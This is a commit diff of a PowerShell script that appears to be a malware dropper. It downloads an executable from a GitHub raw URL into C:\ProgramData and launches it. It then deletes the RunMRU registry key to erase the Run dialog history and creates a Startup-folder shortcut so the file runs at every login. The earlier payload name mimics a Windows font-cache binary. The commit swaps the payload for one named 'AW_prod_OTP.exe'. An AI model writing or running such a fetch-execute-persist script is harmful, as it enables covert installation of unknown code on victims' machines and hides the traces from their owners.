da294694c6df3e7954e40ad1607201998f73a5f6
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-02-12 18:46:13 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,15 +1,15 @@
 Start-Sleep -s 30
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
-$url = 'https://github.com/qwertyuiopindia/test/blob/main/PresentationFontCache.exe?raw=true'
-$file = "C:\ProgramData\PresentationFontCache.exe"
+$url = 'https://github.com/qwertyuiopindia/test2/blob/main/AW_prod_OTP.exe?raw=true'
+$file = "C:\ProgramData\AW_prod_OTP.exe"
 $down.DownloadFile($url,$file)
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $objShell = New-Object -ComObject ("WScript.Shell")
 $objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_OTP.lnk.lnk")
-$objShortCut.TargetPath="C:\ProgramData\PresentationFontCache.exe"
+$objShortCut.TargetPath="C:\ProgramData\AW_prod_OTP.exe"
 $objShortCut.Save()
 exit
 
